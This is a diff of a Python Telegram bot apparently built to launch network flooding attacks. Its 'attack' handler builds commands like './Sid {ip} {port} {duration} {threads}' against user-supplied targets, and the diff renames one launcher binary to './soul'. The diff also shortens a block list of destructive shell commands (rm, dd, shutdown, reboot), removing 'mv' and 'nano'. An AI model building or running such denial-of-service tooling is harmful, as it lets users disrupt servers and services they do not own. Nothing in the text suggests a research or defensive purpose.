@@ -39,7 +39,7 @@ valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')
 # Adjust this to your local timezone, e.g., 'America/New_York' or 'Asia/Kolkata'
 LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
 PROTECTED_FILES = ["Sid.py", "Sid"]
-BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']
+BLOCKED_COMMANDS = [ 'vim', 'shutdown', 'reboot', 'rm','dd']
 
 # Fetch the current user and hostname dynamically
 USER_NAME = os.getlogin()  # Get the current system user
@@ -675,7 +675,7 @@ async def attack(update: Update, context: CallbackContext):
     elif argument_type == 4:
         attack_command = f"./Sid2 {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./Sid {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./soul {ip} {port} {duration} {byte_size} {threads}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
